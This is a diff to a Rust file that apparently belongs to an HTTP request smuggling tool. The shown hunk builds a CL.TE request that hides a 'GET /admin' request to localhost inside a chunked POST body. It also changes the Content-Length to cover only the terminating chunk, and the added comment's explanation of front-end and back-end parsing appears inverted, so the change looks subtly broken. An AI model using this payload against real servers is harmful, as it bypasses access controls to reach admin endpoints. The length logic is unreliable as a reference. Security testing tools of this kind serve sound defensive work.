@@ -95,12 +95,16 @@ impl SmugglingBypass {
 
         let smuggled = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
         let clte_body = format!("0\r\n\r\n{}", smuggled);
+        // Content-Length must cover only the chunk-encoded portion ("0\r\n\r\n" = 5 bytes),
+        // not the smuggled payload. The front-end processes based on CL; the back-end
+        // uses Transfer-Encoding.
+        let chunk_encoded_len = "0\r\n\r\n".len();
         requests.push(SmugglingRequest {
             smuggling_type: SmugglingType::ClTe,
             method: "POST".to_string(),
             path: path.to_string(),
             headers: vec![
-                ("Content-Length".to_string(), format!("{}", clte_body.len())),
+                ("Content-Length".to_string(), format!("{}", chunk_encoded_len)),
                 ("Transfer-Encoding".to_string(), "chunked".to_string()),
             ],
             body: clte_body.into_bytes(),
